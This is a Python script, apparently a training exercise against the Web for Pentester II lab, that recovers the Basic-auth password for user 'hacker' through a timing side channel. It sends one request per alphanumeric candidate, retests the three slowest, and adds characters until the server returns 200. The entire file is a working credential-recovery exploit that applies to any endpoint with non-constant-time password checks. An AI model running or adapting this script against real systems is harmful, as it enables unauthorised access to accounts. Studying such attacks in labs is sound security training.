import requests
import sys


def validate_parameter_length_and_get_base_path():
    """Check that the program is given valid number of arguments
        and returns the host name provided.

    Args:
        None
    Raises:
        ValueError: If the call to program doesnt have req argument count
    Return
        sys.argv[1]: The host name provided as command line argument
    """
    if len(sys.argv) is not 2:
        raise ValueError('Incorrect input! Use the following template: python3 program2_bozic.py base_url')
    return sys.argv[1]


BASE_PATH: str = 'http://' + validate_parameter_length_and_get_base_path()
WFP2_AUTH_EX2_PATH: str = BASE_PATH + '/authentication/example2/'
USERNAME: str = 'hacker'
ALPHANUMERIC_CHARS: str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def main():
    """Do a simple GET to the base URL to verify that a valid
        IP address was given and we can proceed, continue to
        check the password against the authentication endpoint
        until we get a 200 response.
    """
    try:
        resp = requests.get(BASE_PATH)
        if resp.status_code is not 200:
            print("Couldn't establish a connection to the host, is this the correct host name: " + sys.argv[1])
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print("Couldn't establish a connection to the host, check that the IP provided is correct: " + str(e))
        sys.exit(1)

    password = ''
    while 1:
        print("\ncurrent password: " + password + '\n')
        response = requests.get(WFP2_AUTH_EX2_PATH, auth=('hacker', password))
        if response.status_code is 200:
            print('The final password is: ' + password)
            sys.exit(1)
        else:
            password += get_next_character(password)


def get_next_character(current_password: str) -> str:
    """Perform a GET with each alphanumeric character, take
        the 3 requests with largest elapsed time and retry
        them, returning the next iteration of the password.

    Args:
        current_password: The current alphanumeric sequence of the password
    Raises:
        None
    Return
        next_letter_in_password: the next character of the password
    """
    elapsed_times: dict = {}
    print('*** FIRST ITERATION CHECK ***\n')
    for each in ALPHANUMERIC_CHARS:
        response = requests.get(WFP2_AUTH_EX2_PATH, auth=('hacker', current_password + str(each)))
        print('Trying letter: ' + str(each) + ' time: ' + str(response.elapsed.total_seconds()))
        elapsed_times[str(each)] = response.elapsed.total_seconds()

    top_3_list = []
    for i in range(3):
        largest_elapsed_time = max(elapsed_times.keys(), key=(lambda key: elapsed_times[key]))
        top_3_list.append(largest_elapsed_time)
        elapsed_times.pop(largest_elapsed_time)

    second_elapsed_times: dict = {}
    next_letter_in_password = None
    print('\n*** SECOND ITERATION CHECK ***\n')
    for each_time in top_3_list:
        response = requests.get(WFP2_AUTH_EX2_PATH, auth=('hacker', current_password + str(each_time)))
        print('Trying letter: ' + str(each_time) + ' time: ' + str(response.elapsed.total_seconds()))
        second_elapsed_times[str(each_time)] = response.elapsed.total_seconds()
        next_letter_in_password = max(second_elapsed_times.keys(), key=(lambda key: second_elapsed_times[key]))

    return next_letter_in_password


main()
